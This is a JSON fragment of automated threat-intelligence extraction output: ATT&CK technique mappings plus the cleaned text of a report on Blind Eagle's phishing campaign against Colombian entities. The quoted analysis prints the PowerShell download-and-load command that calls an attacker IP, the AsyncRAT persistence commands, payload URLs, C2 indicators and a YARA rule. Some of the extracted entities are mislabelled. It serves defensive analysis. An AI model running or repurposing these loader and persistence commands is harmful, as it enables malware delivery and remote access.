            "technique_name": "Scheduled Task/Job",
            "attack_id": "T1053",
            "tactic": "Persistence",
            "description": "Detected Scheduled Task/Job activity via NLP pattern matching",
            "confidence_score": 0.624,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.139,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "at",
              "rar",
              "PowerShell",
              "reg",
              "wscript",
              "base64",
              "apt",
              "Sc",
              "NET",
              "ping",
              "powershell",
              "schtasks",
              "cmd"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "15b7af44-3cb0-4c29-99a7-bbce396f8b17",
            "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
            "technique_name": "Registry Run Keys",
            "attack_id": "T1547.001",
            "tactic": "Persistence",
            "description": "Detected Registry Run Keys activity via NLP pattern matching",
            "confidence_score": 0.623,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.5,
              "description_detail": 0.199,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "at",
              "rar",
              "PowerShell",
              "reg",
              "wscript",
              "base64",
              "apt",
              "Sc",
              "NET",
              "ping",
              "powershell",
              "schtasks",
              "cmd"
            ],
            "extraction_method": "nlp_indicator"
          }
        ],
        "nlp_analysis": {
          "processed_text": {
            "cleaned_text": "1 / 1 9 Blind Eagle Deploys Fake UUE Files and Fsociety to Target Colombia s Judiciary Financial  Public  and Law Enforcement Entities blogs.blackberry.com/en/2023/02/blind-eagle-apt-c-36-targets-colombia Summary APT-C-36  also known as Blind Eagle  has been actively targeting organizations in Colombia and Ecuador since at least 2019. It relies on spear-phishing emails sent to specific and strategic companies to conduct its campaigns. On Feb. 20  the BlackBerry Research and Intelligence teamwitnessed a new campaign where the threat actor impersonated a Colombian government tax agency to target key industries in Colombia including health  financial  law enforcement  immigration  and an agency in charge of peace negotiation in the country. Based on the infector vector and payload deployment mechanism  we also uncovered campaigns targeting Ecuador  Chile  and Spain. Brief MITRE ATT CK Information Tactic Technique Initial AccessT1566.001 ExecutionT1204.001  T1204.002  T1059.005  T1059.001  T1059.003 PersistenceT1053.005  T1547.001 Defense EvasionT1218.009 Weaponization and Technical Overview Weapons PDF for lures  Visual Basic Scripts  .NET Assemblies injected in memory  Malicious DLLs  PowerShell Attack Vector Spear-phishing attachment with PDF Network InfrastructureDDNS DuckDNS  Discord  Web Applications Targets Entities in Colombia Technical Analysis Context APT-C-36 is a South American cyber espionage group that has been actively targeting Latin America-based entities over the last few years.Although most of its efforts have been focused on Colombia  according to research conducted by CheckPoint researchers  it has also carried outintrusions against Ecuador. The main targets of this group for the last few years have been those related to financial and governmental entities. The initial vector for infection is typically a PDF attachment sent by email. In the case we ll be examining in this report  the sender of thephishing email opted to use the Blind Carbon Copy (BCC) field instead of the To: field  most likely in an attempt to evade spam filters. Theyorchestrated their scam to correspondencia@ccb.org.co  which is the official email address listed on the Contact Us page of the BogotaChamber of Commerce website. Bogot\u00e1  of course  is the Capital of Colombia. The email s Subject line reads   Obligaciones pendientes - DIAN N.2023-6980070- 39898001  - in English  this means  outstandingobligations   a lure craftily designed to catch the attention of unsuspecting law-abiding recipients. DIAN is Colombia s Directorate of NationalTaxes and Customs - the Direcci\u00f3n de Impuestos y Aduanas Nacionales. 2 / 1 9 The letter we analyzed states that the recipient is  45 days in arrears  with a tax payment  and tells the target to click a link to view theirinvoice  which comes in the form of a password-protected PDF. The letter was signed by a (likely fictious)  Roberto Mendoza Ortiz Department Head.  The phishing email s sender is  alfredo agudelo moreno agudelomorenoalfredo79[at]gmail[.]com   an email address whichalso appears to have been be made up specifically for this campaign. We also found another email address associated with this campaign   cobrofactura09291[at]gmail[.]com. The PDF attached to the phishing email tries to trick the recipient with logos and messages related to the Directorate of National Taxes andCustoms. APT-C-36 has regularly used DIAN in their spear-phishing lures over the years  presumably hoping that their targets  wish tomaintain in good standing with the tax authorities would override any natural caution they may have when opening emails sent from anunfamiliar email address. The PDF contains a URL different from the legitimate hyperlink to DIAN s website  which is https://www.dian.gov.co/. The URL shown is thereal one  however  if the user clicks on it  they are redirected to a different website. Finally  the URL field of this new site contains a URL whichdownloads a second-stage payload from the public service Discord. Below is the full intrusion attempt shown step-by-step: Figure 1: Attack flow of Blind Eagle s campaign analyzed Attack Vector Hashes (md5  sha-256)e4d2799f3001a531d15939b1898399b4 fc85d3da6401b0764a2e8a5f55334a7d683ec20fb8210213feb6148f02a30554 File name Fv3608799004720042L900483000P19878099700001537012.pdf File Size 507436 bytes Created 2023:01:25 10:07:03-05:00 Author Direcci\u00f3n De Aduanas Nacionales Calle 23   157-25 la Last Modified2023:01:25 10:07:03-05:00 3 / 1 9 DocumentIDuuid:9585FD65-6D08-453D-9E4A-51155AD12748 What is the DIAN  The Directorate of National Taxes and Customs is an entity attached to the Ministry of Finance and Public Credit. The DIAN is organized as aSpecial Administrative Unit of the national order. Its purpose is to help guarantee the fiscal security of the Colombian State and the protectionof the national economic public order through the administration and control of due compliance with tax  customs  and exchange obligations.The jurisdiction of the DIAN includes the national territory. It is headquartered in Bogot\u00e1  the Capital of Colombia. Weaponization Blind Eagle carefully targets its victims with spear-phishing emails  in a similar fashion to other campaigns by the group. It entices its targets toclick links contained in the body of the email  or to download a malicious PDF file  which purports to contain information about overdue taxes. The URL shown on the bait document masquerades as the actual domain of DIAN. However  when clicked  the hyperlink leads to anotherdomain created entirely by the threat actor using the public service website[.]org. The link redirects the target to dian.server[.]tl. This craftytechnique is known as URL phishing. 4 / 1 9 Figure 2: Content of the bait email  masquerading as the Directorate of National Taxes and Customs In English  the bait document reads: 5 / 1 9 Dear taxpayer  At DIAN we maintain our commitment to provide you with the necessary assistance and services so that you can comply in a timely andcorrect manner with your tax obligations. For this reason  we remind you that you are in arrears with your obligations. for an amount owed of THREE MILLION TWO HUNDREDFIFTY-TWO THOUSAND ONE HUNDRED FORTY PESOS  with 45 days in arrears due to the lack of commitment in your financialobligations regulated in law 0248 of the year 2005 numeral 12. Next  we put at your disposal the Virtual PDF with all the details of your obligations generated to date. Submit a foreclosure process and pay on time. In the following link you will find the invoice in PDF format. To view the document  enter the password: A2023 Cordially  ROBERTO MENDOZA ORTIZ Department Head When the victim clicks on the masked link in the email  they are redirected to dian.server[.]tl. The threat actor carefully crafted this webpage todeceive the victim into believing they are interacting with the real DIAN. Figure 3: Content presented to the user on the fake webpage dian.server[.]tl Looking at the code of the webpage  the content presented to the users is loaded from website[.]org/s8Xwt2 or website[.]org/render/s8Xwt2 and not from dian.server[.]tl. This is accomplished by using an iframe resized to the 100  of the screen. 6 / 1 9 Figure 4: The content the victim sees is shown on the left  which is loaded from the resource shown on the right The fake DIAN website page contains a button that encourages the victim to download a PDF to view what the site claims to be pending taxinvoices. Clicking the blue button initiates the download of a malicious file from the Discord content delivery network (CDN)  which theattackers are abusing in this phishing scam. hxxps://cdn.discordapp[.]com/attachments/1067819339090243727/1071063499494666240/Asuntos_DIAN_N34000137L287004P0889903-02-2023-pdf[.]uuehxxps://cdn.discordapp[.]com/attachments/1066009888083431506/1070342535702130759/Asuntos_DIAN_N6440005403992837L208801-02-2023-pdf[.]uuehxxps://cdn.discordapp[.]com/attachments/1072851594812600351/1072851643583967272/Asuntos_DIAN_N3663000227L2870000002408-02-2023-pdf[.]uue The downloaded file tries to trick the user into manually adding the word  pdf  at the end of the filename. However  the real extension isactually  uue.  This is a file extension WinRAR opens by default. Behind the extension there is a .RAR archive. Figure 5: Default installation of WinRAR with uue extension Hashes (md5  sha-256)B432202CF7F00B4A4CBE377C284F3F28 6D9D0EB5E8E69FFE9914C63676D293DA1B7D3B7B9F3D2C8035ABE0A3DE8B9FCA 7 / 1 9 File Name Asuntos_DIAN_N6440005403992837L2088970004-01-02-2023-pdf.uue File Size 1941 (bytes) It s necessary to decompress the contents of the .uue file to continue with the infection chain. The compressed .uue file contains yet another fileinside it. The inner file uses the same naming convention as the parent  but in this case  the new file is a Visual Basic Script (VBS). Figure 6: Content of the malicious .uue file Hashes (md5  sha-256)6BEF68F58AFCFDD93943AFCC894F8740 430BE2A37BAC2173CF47CA1376126A3E78A94904DBC5F304576D87F5A17ED366 File name Asuntos_DIAN_N 6440005403992837L2088970004-01-02-2023-pdf.vbs File Size 227378 (bytes) Last Modified2023:01:31 23:01:04 The file-extracted VBS script is executed via wscript.exe once the user double-clicks the file  so an element of user-interaction is involved inexecuting the attack. Upon execution  the infection chain starts automatically and carries out various actions within the system without anyfurther user input  as seen below in figure 7. Figure 7: Process tree once the VBS script is manually executed by the user The VBS script s content is encoded but easy for a researcher to understand and decode. 8 / 1 9 Figure 8: Content of the VBS script The VBS script contains a significant amount of junk code  but has several replace functions to construct the PowerShell execution. Figure 9: Replace functions to replace junk code by the original behavior The content was built under the variable  OXVTEUOWQPEFWQ   as shown in figure 9 above. After creating that content  figure 8 shows thevariable  YISMXXAPAUXCGFI   which is set as a WScript object. After decoding the code  to better understand its behavior  we can see that a part of the logic - the URL shown in the above image - is actuallyreversed. 9 / 1 9 Figure 10: Part of the VBS code decoded Figure 11: A closer look at part of the VBS code  decoded The final payload executed is powershell.exe  with the following command line parameters:  C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe  [Byte[]] $rOWg   [system.Convert]::FromBase64string((New-Object Net.WebClient).DownloadString( hxxp://172.174.176[.]153/dll/Dll.ppam )) [System.AppDomain]::CurrentDomain.Load($rOWg).GetType( Fiber.Home ).GetMethod( VAI ).Invoke($null  [object[]]( txt.ysa/3383903646370010701/3046420575525667501/stnemhcatta/moc.ppadrocsid.ndc//:sptth )) First  PowerShell downloads and executes the decoded base64 content of hxxp://172.174.176[.]153/dll/Dll.ppam  which is a .NET DLLencoded  as shown in figure 12. 1 0 / 1 9 Figure 12: Base64 content from the server  called using powershell.exe Next  it uses GetType( Fiber.home ).GetMethod( VAI )  to load the VAI method from the DLL downloaded previously. The logic of this methodis as follows: To create a copy of the Visual Basic Script called  Asuntos_DIAN_N 6440005403992837L2088970004-01-02-2023-pdf.vbs  inC:\\Windows\\Temp\\OneDrive.vbs if it already doesn t exist using PowerShell.Powershell.exe -WindowStyle Hidden Copy-Item -Path  .vbs -Destination C:\\Windows\\Temp\\OneDrive.vbsDownload the content of hxxp://172.174.176[.]153/rump/Rump.xls (Fsociety)Replace characters of the content downloadedReverse the text of the second URL in the PowerShell command and download its content(hxxps://cdn.discordapp[.]com/attachments/1057665255750246403/1070100736463093833/asy[.]txt (AsyncRAT payload)Create a string with the content  C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegSvcs.exe Load the Fsociety DLL into memory  passing two parameters:RegSvcs pathAsyncRAT payloadFsociety DLL loads AsyncRAT in the RegSvcs process using the Process Hollowing technique To better understand the PowerShell execution  the following image demonstrates the sequence of loading DLLs dynamically in memory untilthe final goal  which is to load AsyncRAT into memory. AsyncRAT is one of the most popular open-source remote access Trojans (RATs) on thethreat landscape today. 1 1 / 1 9 Figure 13: Sequence of loaded DLLs after PowerShell execution The following image is part of all the behavior described above  related to the first DLL loaded using the PowerShell command spawned by theVBS Script and calling the  VAI  method. 1 2 / 1 9 Figure 14: Part of the method VAI previously called by PowerShell As mentioned  Fsociety.dll is used to load the final payload of AsyncRAT  which is downloaded from Discord. Blind Eagle mainly uses AsyncRAT  njRAT  QuasarRAT  LimeRAT  and RemcosRAT in its campaigns. A RAT is a remote access tool a networkadmin may use to remotely administrate the node. So a malicious RAT installed on a victim s machine enables the threat actor to connect to theinfected endpoint any time they like  and to perform any operations they desire. Figure 15: Fsociety.dll is used to load AsyncRAT in memory The  Ande  function called in the Fsociety.dll contains the following code: 1 3 / 1 9 Figure 16: Fsociety DLL code Hashes (md5  sha-256)C75F9D3DA98E57B973077FDE8EC3780F 5399BF1F18AFCC125007D127493082005421C5DDEBC34697313D62D8BC88DAEC File Name Fiber.dll (Dll.ppam) File Size 10240 bytes Compiled Thu Feb 02 21:43:24 2023   UTC 1 4 / 1 9 Hashes (md5  sha-256)07AF8778DE9F2BC53899AAC7AD671A72 03B7D19202F596FE4DC556B7DA818F0F76195912E29D728B14863DDA7B91D9B5 File Name Fsociety.dll (Rump.xls) File Size 25600 bytes Compiled Sat May 18 00:13:09 2086   UTC Hashes (md5  sha-256)5E518B80C701E17259F3E7323EFFC83F 64A08714BD5D04DA6E2476A46EA620E3F7D2C8A438EDA8110C3F1917D63DFCFC File Name Stub.exe (AsyncRAT payload) File Size 26080 bytes Compiled Sun May 10 05:24:51 2020   UTC AsyncRAT contains a configuration method with information that is used during the intrusion attempt. This information is encrypted usingBase64 and AES256. Figure 17: AsyncRAT configuration encrypted Once the configuration is decrypted  it contains information about the Command-and-Control (C2) to transfer commands and files betweenclient and server. 1 5 / 1 9 Figure 18: AsyncRAT configuration decrypted Also  between the configuration  it was possible to obtain the X.509 certificates used for communication with the C2. Figure 19: Certificate extracted from the AsyncRAT config AsyncRAT can establish persistence in two different ways  depending on whether a user loaded it with admin privileges or not. A copy of itselfis first created under C:\\Users\\ user \\AppData\\Roaming\\MRR.exe. Figure 20: Creation of MRR in AppData folder 1. If the user who executed it was an admin  then AsyncRAT can create a scheduled task using the process schtasks.exe  with the followingcommand line: a.  C:\\Windows\\System32\\cmd.exe  /c schtasks /create /f /sc onlogon /rl highest /tn  MRR  /tr   C:\\Users\\ user \\AppData\\Roaming\\MRR.exe     exit  Figure 21: Execution of schtasks.exe via cmd.exe Figure 22: Command line executed to create scheduled task and run AsyncRAT 2. If the user is not an admin  then AsyncRAT can create a registry key to execute the binary every time the system is started: 1 6 / 1 9 a. Key: KCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MRRb. Value: C:\\Users\\ user \\AppData\\Roaming\\MRR.exe Figure 23: Registry key created to execute the AsyncRAT Payload An interesting part that always happens  regardless of whether the user is admin or not  is the creation of a .bat file in the user s Temp directoryto perform the following actions: a. Timeout.exe execution for three seconds b. Run the AsyncRAT payload from AppData folder c. Delete the .bat file Figure 24: tmp file creation in the Temp directory Figure 25: Execution of cmd.exe to load the .bat file from tmp folder We could determine that the .bat filename is randomly generated using the regular expression after several executions of this sample. Thestructure is like the next one: . tmp[a-zA-Z1-9]{4}.tmp.bat. 1 7 / 1 9 Figure 26: Persistence methods used by AsyncRAT Network Infrastructure In this case  the victim s machine starts communicating with the DuckDNS server to receive and execute commands  exfiltrate information and perform any other action desired by the threat actor. As seen in figure 18 above  the server used is asy1543.duckdns[.]org:1543. Figure 27: Communication started between victim s machine and the threat actor s C2 During our investigation  the resolution of the DuckDNS domain was changed to different IP addresses. Initially  the IP that resolves thedomain was a VPN/Proxy service 46.246.86[.]3. While conducting the investigation  we discovered another IP with the same purpose 46.246.12[.]6. EntityValue Description 1 8 / 1 9 Domainasy1543.duckdns[.]org:1543Final AsyncRAT payload communication domain IP 46.246.86[.]3 Resolution of the DuckDNS domain IP 46.246.12[.]6 Resolution of the DuckDNS domain URL hxxp://172.174.176[.]153/Web application hosting payloads used during the infection IP 172.174.176[.]153IP of the web application hosting payloads used during the infection Blind Eagle/ APT-C-36 uses Dynamic DNS (DDNS) services  such as DuckDNS  for most campaigns to connect its implemented RATs to theinfrastructure they control to send and receive commands. DuckDNS additionally allows for high IP resolution rotation and the launch of newsubdomains under this well-known DDNS The application web hosted under hxxp://172.174.176[.]153/ had two main directories where it stored information to be used during theintrusion as the user downloads and executes files. The first directory was hxxp://172.174.176[.]153/dll/  storing several DLLs used during the intrusion. Figure 28: Index of APT-C-36 s /dll directory Another directory is found at hxxp://172.174.176[.]153/rump/ and stores another DLL  in this case  related to Fsociety: Figure 29: index of /rump directory Targets Blind Eagle/ APT-C-36 s targets include health  public  financial  judiciary  and law enforcement entities in Colombia. Among the countries where we have seen Blind Eagle activity in the last few months  specifically distributing the UUE file types with differentthemes  include: 1 9 / 1 9 ColombiaEcuadorChileSpain This is consistent with the use of the Spanish language in the group s spear-phishing emails. Most countries in South America use Spanish(apart from Brazil)  which matches the threat actor s locale and the names in the bait document. Attribution APT-C-36 is a South American-based threat actor active since at least 2019. The group continues to concentrate its operations within aHispanic geographic region  with its main targets being government institutions and other organizations primarily based in Colombia. The use of specific tools and artifacts  along with the type and configuration of the network infrastructure documented in this report  combinedwith the tactics  techniques   procedures (TTPs) used to deploy them  all closely align with previously attributed campaigns by this group. That  coupled with the geolocation and nature of the targets seen in this campaign  leads us to ascertain  at the very least  a moderate level ofconfidence that this campaign was conducted by APT-C-36. Conclusions This campaign continues to operate for the purposes of information theft and espionage. The modus operandi used has mostly stayed the sameas the group s previous efforts   it is very simple  which may mean that this group is comfortable with its way of launching campaigns viaphishing emails  and feels confident in using them because they continue to work. Over the next few months  we will likely continue to see new targets for this group  using new ways to deceive their victims. APPENDIX 1 - Applied Countermeasures Yara Rules rule targeted_BlindEagle_Loader : Fsociety { meta: description    Rule to detect BlindEagle malicious Loader  author    The BlackBerry Research   Intelligence team  date    2023-02-07  last_modified    2023-02-22  distribution    TLP:White  version    1.0  strings: $h0  {6449640053697A655F00526573657276656431004465736B746F70005469746C65006477580064775900647758536 97A650064775953697A6500647758436F756E74436861727300647759436F756E74436861727300647746696C6C41747472} $h1  {000004200101022901002434353136453045312D354330452D344234452D394133322D39453337453233453734323600000C01000731 2E302E302E3000004901001A2E4E45544672616D65776F726B2C5665} condition: uint16(0)    0x5A4D and filesize   100KB and 1 of ($h ) } Disclaimer: The private version of this report is available upon request. It includes but is not limited to the complete and contextual MITREATT CK  mapping  MITRE D3FEND  countermeasures  and other threat detection content for tooling  network traffic  complete IOCs list and system behavior. Please email us at cti@blackberry.com for more information. About The BlackBerry Research   Intelligence Team The BlackBerry Research   Intelligence team examines emerging and persistent threats  providing intelligence analysis for the benefit ofdefenders and the organizations they serve.",
            "commands": [
              "Powershell.exe -WindowStyle Hidden Copy-Item -Path *.vbs -Destination C:\\Windows\\Temp\\OneDrive.vbsDownload the content of hxxp://172.174.176[.]153/rump/Rump.xls (Fsociety)Replace characters of the content downloadedReverse the text of the second URL in the PowerShell command and download its content(hxxps://cdn.discordapp[.]com/attachments/1057665255750246403/1070100736463093833/asy[.]txt (AsyncRAT payload)Create a string with the content \u201cC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegSvcs.exe\u201dLoad the Fsociety DLL into memory, passing two parameters:RegSvcs pathAsyncRAT payloadFsociety DLL loads AsyncRAT in the RegSvcs process using the Process Hollowing technique",
              "PowerShell execution, the following image demonstrates the sequence of loading DLLs dynamically in memory untilthe final goal, which is to load AsyncRAT into memory. AsyncRAT is one of the most popular open-source remote access Trojans (RATs) on thethreat landscape today.",
              "PowerShell execution",
              "schtasks /create /f /sc onlogon /rl highest /tn \"MRR\" /tr '\"C:\\Users\\<user>\\AppData\\Roaming\\MRR.exe\"' & exit'",
              "PowerShell execution.",
              "PowerShell command spawned by theVBS Script and calling the \u2018VAI\u2019 method.",
              "PowerShell\nAs mentioned, Fsociety.dll is used to load the final payload of AsyncRAT, which is downloaded from Discord.",
              "PowerShell\nAttack Vector Spear-phishing attachment with PDF",
              "powershell.exe\nNext, it uses GetType(\u2018Fiber.home\u2019).GetMethod(\u2018VAI\u2019), to load the VAI method from the DLL downloaded previously. The logic of this methodis as follows:",
              "PowerShell downloads and executes the decoded base64 content of hxxp://172.174.176[.]153/dll/Dll.ppam, which is a .NET DLLencoded, as shown in figure 12. "
            ],
            "file_paths": [
              "/3383903646370010701/3046420575525667501/stnemhcatta/moc.ppadrocsid.ndc/",
              "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegSvcs.exe\u201dLoad",
              "/172.174.176[.]153/dll/Dll.ppam,",
              "C:\\Windows\\System32\\cmd.exe",
              "/",
              "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
              "/172.174.176[.]153/rump/Rump.xls",
              "C:\\Users\\",
              "/cdn.discordapp[.]com/attachments/1072851594812600351/1072851643583967272/Asuntos_DIAN_N3663000227L2870000002408-02-2023-pdf[.]uue",
              "/172.174.176[.]153/rump/",
              "/172.174.176[.]153/Web",
              "C:\\Windows\\Temp\\OneDrive.vbs",
              "/cdn.discordapp[.]com/attachments/1067819339090243727/1071063499494666240/Asuntos_DIAN_N34000137L287004P0889903-02-2023-pdf[.]uuehxxps:/",
              "C:\\Windows\\Temp\\OneDrive.vbsDownload",
              "/172.174.176[.]153/dll/Dll.ppam'));[System.AppDomain]::CurrentDomain.Load($rOWg).GetType('Fiber.Home').GetMethod('VAI').Invoke($null,",
              "/172.174.176[.]153/dll/,",
              "/www.dian.gov.co/.",
              "/cdn.discordapp[.]com/attachments/1057665255750246403/1070100736463093833/asy[.]txt",
              "/172.174.176[.]153/",
              "/cdn.discordapp[.]com/attachments/1066009888083431506/1070342535702130759/Asuntos_DIAN_N6440005403992837L208801-02-2023-pdf[.]uuehxxps:/"
            ],
            "registry_keys": []
          },
          "entities": {
            "malware": [
              "Loader",
              "Trojan",
              "apt",
              "conti",
              "payload",
              "rat",
              "remote access Trojan"
            ],
            "tools": [
              "NET",
              "PowerShell",
              "Sc",
              "at",
              "cmd",
              "ping",
              "reg",
              "schtasks",
              "wscript"
            ],
            "threat_actors": [],
            "ips": [],
            "domains": [
              "01-02-2023-pdf.uue",
              "6440005403992837L2088970004-01-02-2023-pdf.vbs",
              "CurrentDomain.Load",
              "Dll.ppam",
              "Domainasy1543.duckdns",
              "Fiber.Home",
              "Fiber.dll",
              "Fiber.home",
              "Fsociety.dll",
              "Fv3608799004720042L900483000P19878099700001537012.pdf",
              "MRR.exe",
              "Microsoft.NET",
              "Net.WebClient",
              "OneDrive.vbs",
              "OneDrive.vbsDownload",
              "PowerShell.Powershell.exe",
              "RegSvcs.exe",
              "Rump.xls",
              "Stub.exe",
              "System.AppDomain",
              "Timeout.exe",
              "asy1543.duckdns",
              "blackberry.com",
              "blogs.blackberry.com",
              "ccb.org.co",
              "cdn.discordapp",
              "cmd.exe",
              "dian.server",
              "moc.ppadrocsid.ndc",
              "obligations.The",
              "powershell.exe",
              "schtasks.exe",
              "system.Convert",
              "tmp.bat",
              "txt.ysa",
              "wscript.exe",
              "www.dian.gov.co",
              "years.Although"
            ],
            "hashes": {
              "md5": [
                "07AF8778DE9F2BC53899AAC7AD671A72",
                "5E518B80C701E17259F3E7323EFFC83F",
                "6BEF68F58AFCFDD93943AFCC894F8740",
                "B432202CF7F00B4A4CBE377C284F3F28",
                "C75F9D3DA98E57B973077FDE8EC3780F"
              ],
              "sha256": [
                "03B7D19202F596FE4DC556B7DA818F0F76195912E29D728B14863DDA7B91D9B5",
                "430BE2A37BAC2173CF47CA1376126A3E78A94904DBC5F304576D87F5A17ED366",
                "5399BF1F18AFCC125007D127493082005421C5DDEBC34697313D62D8BC88DAEC",
                "64A08714BD5D04DA6E2476A46EA620E3F7D2C8A438EDA8110C3F1917D63DFCFC",
                "6D9D0EB5E8E69FFE9914C63676D293DA1B7D3B7B9F3D2C8035ABE0A3DE8B9FCA"
              ]
            }
          },
          "ttp_indicators": {
            "initial_access": [
              "Phishing"
            ],
            "execution": [
              "PowerShell",
              "Command and Scripting Interpreter"
            ],
            "persistence": [
              "Registry Run Keys",
              "Scheduled Task/Job",
              "Create or Modify System Process"
            ],
            "defense_evasion": [
              "Obfuscated Files or Information",
              "Process Injection"
            ],
            "collection": [
              "Archive Collected Data"
            ],
            "exfiltration": [
              "Exfiltration Over C2 Channel"
            ],
            "command_and_control": [
              "Application Layer Protocol"
            ]
          },
          "context": "**Observed Commands:**\n- Powershell.exe -WindowStyle Hidden Copy-Item -Path *.vbs -Destination C:\\Windows\\Temp\\OneDrive.vbsDownload the content of hxxp://172.174.176[.]153/rump/Rump.xls (Fsociety)Replace characters of the content downloadedReverse the text of the second URL in the PowerShell command and download its content(hxxps://cdn.discordapp[.]com/attachments/1057665255750246403/1070100736463093833/asy[.]txt (AsyncRAT payload)Create a string with the content \u201cC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegSvcs.exe\u201dLoad the Fsociety DLL into memory, passing two parameters:RegSvcs pathAsyncRAT payloadFsociety DLL loads AsyncRAT in the RegSvcs process using the Process Hollowing technique\n- PowerShell execution, the following image demonstrates the sequence of loading DLLs dynamically in memory untilthe final goal, which is to load AsyncRAT into memory. AsyncRAT is one of the most popular open-source remote access Trojans (RATs) on thethreat landscape today.\n- PowerShell execution\n- schtasks /create /f /sc onlogon /rl highest /tn \"MRR\" /tr '\"C:\\Users\\<user>\\AppData\\Roaming\\MRR.exe\"' & exit'\n- PowerShell execution.\n\n**File System Activity:**\n- /3383903646370010701/3046420575525667501/stnemhcatta/moc.ppadrocsid.ndc/\n- C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegSvcs.exe\u201dLoad\n- /172.174.176[.]153/dll/Dll.ppam,\n- C:\\Windows\\System32\\cmd.exe\n- /\n\n**Network Indicators:**\n- Timeout.exe\n- wscript.exe\n- cdn.discordapp\n- Stub.exe\n- blogs.blackberry.com\n- Net.WebClient\n- Domainasy1543.duckdns\n- OneDrive.vbsDownload\n- moc.ppadrocsid.ndc\n- txt.ysa\n\n**Key Security Terms:** establish, privilege, installation, payload, extract, command-and-control, task, persistence, evasion, execute"
        },
        "metadata": {
          "extraction_method": "LangChain-Enhanced",
          "nlp_processing_time_ms": 16.733999999999998,
          "llm_processing_time_ms": 5010.329
        }
      }
    ],
    "ttps": [
      {
        "ttp_id": "62c39b6f-13ca-4c4c-aff5-248f8fb99c08",
        "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
        "technique_name": "Execution",
        "attack_id": "T1204.001",
        "tactic": "Execution",
        "description": "Threat actor used .NET Assemblies injected in memory to execute malicious code",
        "confidence_score": 0.728,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.9,
          "ioc_evidence": 0.58,
          "description_detail": 0.314,
          "tool_mentions": 1.0,
          "context_richness": 0.96,
          "multiple_sources": 0.5
        },
        "indicators": [
          ".NET Assemblies",
          "memory injection"
        ],
        "tools": [
          "at",
          ".NET Assemblies",
          "rar",
          "PowerShell",
          "reg",
          "wscript",
          "base64",
          "apt",
          "Sc",
          "NET",
          "ping",
          "powershell",
          "schtasks",
          "cmd"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "23a41002-3566-4552-a48c-5e948df3977a",
        "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
        "technique_name": "Persistence",
        "attack_id": "T1053.005",
        "tactic": "Persistence",
        "description": "Threat actor used malicious DLLs to maintain persistence on the target system",
        "confidence_score": 0.716,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.9,
          "ioc_evidence": 0.54,
          "description_detail": 0.276,
          "tool_mentions": 1.0,
          "context_richness": 0.96,
          "multiple_sources": 0.5
        },
        "indicators": [
          "malicious DLLs"
        ],
        "tools": [
          "at",
          "DLLs",
          "rar",
          "PowerShell",
          "reg",
          "wscript",
          "base64",
          "apt",
          "Sc",
          "NET",
          "ping",
          "powershell",
          "schtasks",
          "cmd"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "8929a83e-253c-4e05-9876-a0f4976bfd89",
        "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
        "technique_name": "PowerShell",
        "attack_id": "T1059.001",
        "tactic": "Execution",
        "description": "Threat actor used PowerShell to execute malicious commands",
        "confidence_score": 0.703,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.9,
          "ioc_evidence": 0.54,
          "description_detail": 0.184,
          "tool_mentions": 1.0,
          "context_richness": 0.96,
          "multiple_sources": 0.5
        },
        "indicators": [
          "powershell.exe"
        ],
        "tools": [
          "at",
          "rar",
          "PowerShell",
          "reg",
          "wscript",
          "base64",
          "apt",
          "Sc",
          "NET",
          "ping",
          "powershell",
          "schtasks",
          "cmd"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "d19cea20-d8fe-4405-ac1e-2b7e008eac57",
        "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
        "technique_name": "Spearphishing Attachment",
        "attack_id": "T1566.001",
        "tactic": "Initial Access",
        "description": "Threat actor sent spear-phishing emails with PDF attachments to target key industries in Colombia",
        "confidence_score": 0.69,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.9,
          "ioc_evidence": 0.74,
          "description_detail": 0.322,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "e4d2799f3001a531d15939b1898399b4",
          "fc85d3da6401b0764a2e8a5f55334a7d683ec20fb8210213feb6148f02a30554",
          "Fv3608799004720042L900483000P19878099700001537012.pdf",
          "correspondencia@ccb.org.co",
          "alfredo agudelo moreno agudelomorenoalfredo79@gmail.com",
          "cobrofactura09291@gmail.com"
        ],
        "tools": [
          "PDF",
          "at",
          ".NET Assemblies",
          "rar",
          "PowerShell",
          "reg",
          "wscript",
          "Visual Basic Scripts",
          "Sc",
          "apt",
          "NET",
          "base64",
          "ping",
          "powershell",
          "schtasks",
          "cmd"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "99f9005b-fcf9-4cc2-ac4d-7e8a01b3df21",
        "report_id": "pdf-1a58fe0f4bae14dffeca4aa79acb8884",
        "technique_name": "Phishing",
        "attack_id": "T1566",
        "tactic": "Initial Access",
